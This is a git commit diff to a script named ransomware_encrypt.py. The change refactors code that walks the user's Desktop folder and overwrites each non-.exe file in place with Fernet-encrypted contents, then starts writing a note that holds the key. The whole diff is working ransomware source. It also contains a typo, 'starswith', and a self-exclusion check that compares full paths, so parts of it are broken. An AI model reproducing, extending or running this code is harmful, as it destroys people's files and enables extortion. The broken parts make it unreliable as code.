5aa16393110a995b3fc3a7d424e172f129f56a4b
Chris <45925152+Motzumoto@users.noreply.github.com>
2023-03-09 15:58:17 -0500

    make this better too

--- ransomware_encrypt.py
+++ ransomware_encrypt.py
@@ -1,4 +1,5 @@
 import os
+import glob
 from cryptography.fernet import Fernet
 
 # generate a random symmetric key
@@ -8,24 +9,31 @@ key = Fernet.generate_key()
 fernet = Fernet(key)
 
 # specify the directory to encrypt
-directory = "C:/Users/%userprofile%/Desktop/Test" # I don't actually know if %userprofile% works because i didn't test it 
+directory = os.path.expanduser("~/Desktop")
+
+def encrypt_file(filename):
+    # skip over exe files
+    if filename.endswith(".exe"):
+        return
+    if filename.starswith("ransomware"):
+        return
+
+    try:
+        # open the file, read the contents and encrypt them
+        with open(filename, "rb") as file:
+            encrypted = fernet.encrypt(file.read())
+        # write the encrypted data back to the file
+        with open(filename, "wb") as file:
+            file.write(encrypted)
+        print(f"Encrypted {filename}")
+    except PermissionError:
+        print(f"Skipped {filename}")
 
 # encrypt all the files in the directory and its subdirectories
 for root, dirs, files in os.walk(directory):
-    for filename in files:
-        # skip over exe files
-        if filename.endswith(".exe"): # os.walk likes to error on exe files, gives a "permission error" lol
-            continue
-        try:
-            # open the file, read the contents and encrypt them
-            with open(os.path.join(root, filename), "rb") as file:
-                encrypted = fernet.encrypt(file.read())
-            # write the encrypted data back to the file
-            with open(os.path.join(root, filename), "wb") as file:
-                file.write(encrypted)
-            print(f"Encrypted {os.path.join(root, filename)}")
-        except PermissionError:
-            print(f"Skipped {os.path.join(root, filename)}")
+    for file in files:
+        filename = os.path.join(root, file)
+        encrypt_file(filename)
 
 # create a note with the key
 try:
